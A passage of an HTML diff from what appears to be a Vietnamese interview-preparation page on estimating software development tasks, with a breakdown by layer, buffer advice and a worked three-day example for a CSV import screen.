+                <li><strong>Bẻ task ≤ 1 ngày</strong> (0.5 ngày là đẹp) theo từng tầng: Controller → Service → Mapper/SQL → test → tài liệu.</li>
+                <li><strong>So với task tương tự đã làm</strong> (velocity thực tế): màn hình import trước mất 3 ngày thì màn hình tương tự cũng khoảng 2,5–3 ngày.</li>
+                <li><strong>Tính cả phần “không phải code”:</strong> đọc DD, viết UTC, chụp evidence/UTR, fix bug sau UTR — thường chiếm 40–50% thời gian.</li>
+                <li><strong>Cộng buffer 10–20%</strong> cho rủi ro (tích hợp, chờ review, dữ liệu thật bất ngờ).</li>
+                <li><strong>Trao đổi với TL và cam kết theo ngày</strong>; sau 1 ngày code thật nếu lệch thì báo sớm để điều chỉnh — không giấu đến deadline.</li>
+              </ol>
+              <p><strong>Ví dụ estimate task “màn hình import CSV thiết bị” — tổng 3 ngày:</strong></p>
+              <pre><code>0.5 ngày  Đọc DD + chốt rule validate + hỏi BA điểm mơ hồ
+1.0 ngày  Coding: Controller + Service (parse/validate) + Mapper batch insert
+0.5 ngày  Unit Test theo UTC (file hợp lệ, lỗi từng dòng, encoding)
+0.5 ngày  UTR: chụp evidence, chạy free test, log bug Jira
+0.5 ngày  Buffer: file thật của khách (Shift-JIS), fix review comment
+----------------------------------------------------------------
+3.0 ngày  Báo TL theo ngày; lệch &gt; 20% sau ngày 1 thì cập nhật lại ngay</code></pre>
+              <ul>
+                <li><strong>Nếu bị ép gấp:</strong> cắt scope có kiểm soát (VD chưa làm export riêng, chưa hỗ trợ Shift-JIS) và nói rõ phần cắt — không cắt Unit Test rồi nhận ẩu.</li>
+                <li><strong>1 ngày công</strong> tính khoảng 6 giờ làm việc thật (trừ họp/standup), không phải 8 giờ.</li>
+              </ul>
+              <p><strong>Chốt khi phỏng vấn:</strong> “Em estimate dựa trên task tương tự đã làm + bẻ nhỏ theo tầng + buffer, và luôn báo sớm khi lệch kế hoạch.”</p>
             </div>
           </details>
         </div>
